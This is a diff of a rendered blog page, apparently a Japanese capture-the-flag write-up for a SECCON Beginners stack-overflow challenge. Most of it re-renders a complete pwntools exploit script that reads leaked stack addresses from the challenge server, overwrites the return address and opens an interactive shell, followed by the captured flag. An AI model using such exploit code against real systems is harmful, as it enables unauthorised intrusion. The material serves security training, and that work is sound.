-<span class="n">saved_vuln</span><span class="o">=</span><span class="n">saved_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">ret_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">ret_vuln</span><span class="o">=</span><span class="n">ret_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">saved_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">saved_main</span><span class="o">=</span><span class="n">saved_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">ret_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">ret_main</span><span class="o">=</span><span class="n">ret_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
-
-<span class="c1"># padding</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
-
-<span class="c1"># saved_vuln address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-
-<span class="c1"># ret_vuln address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">18</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-
-<span class="s2">&#34;&#34;&#34;
-</span><span class="s2"># saved_main address
-</span><span class="s2">for i in reversed(range(0,len(saved_main),2)):
-</span><span class="s2">    if i==len(saved_main)-2:
-</span><span class="s2">        send_data+=chr(int(saved_main[i:i+2],16)-0)
-</span><span class="s2">    else:
-</span><span class="s2">        send_data+=chr(int(saved_main[i:i+2],16))
-</span><span class="s2">&#34;&#34;&#34;</span>
-
-<span class="c1"># change address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">terget_address</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">terget_address</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
-
-<span class="c1"># ret_main address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_main</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-
-<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input: &#34;</span><span class="p">)</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">result</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_data</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_rbp</span><span class="o">=</span><span class="s2">&#34;400ad0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">terget_address</span><span class="o">=</span><span class="s2">&#34;400861&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">saved_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;bs.quals.beginners.seccon.jp&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_vuln</span><span class="o">=</span><span class="n">saved_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_vuln</span><span class="o">=</span><span class="n">ret_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_main</span><span class="o">=</span><span class="n">saved_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_main</span><span class="o">=</span><span class="n">ret_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># saved_vuln address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ret_vuln address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2"># saved_main address
+</span></span></span><span class="line"><span class="cl"><span class="s2">for i in reversed(range(0,len(saved_main),2)):
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if i==len(saved_main)-2:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        send_data+=chr(int(saved_main[i:i+2],16)-0)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    else:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        send_data+=chr(int(saved_main[i:i+2],16))
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># change address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">terget_address</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">terget_address</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ret_main address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_main</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>あぁスッキリした。<br />
 この後はシェルに入れるので、</p>
@@ -3061,7 +3061,7 @@ ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada}
 </div>
 
 
-<script defer src="/blog/js/swipe.min.989e074dfb92ce7f57a92c1df7027f88b53c50a54fd9ad450a673a64aa91bfa4.js"></script>
+<script defer src="/blog/js/swipe.min.5b45017db39b94db049dd81e997decf8d1d711d8e3efcb65cde3b58e7e456506.js"></script>
 
 <script defer src="/blog/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
